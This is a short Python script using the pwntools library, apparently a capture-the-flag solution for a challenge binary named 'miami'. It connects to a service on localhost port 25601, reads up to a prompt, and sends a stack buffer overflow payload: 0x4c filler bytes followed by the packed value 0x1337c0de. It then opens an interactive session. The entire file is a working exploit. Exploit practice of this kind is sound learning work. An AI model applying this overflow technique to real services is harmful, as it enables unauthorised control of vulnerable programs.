from pwn import *

#p = process('.build/miami')
p = remote('localhost', 25601)

p.recvuntil(b': ')

payload = b'A' * 0x4c + p32(0x1337c0de)

p.sendline(payload)

p.interactive()
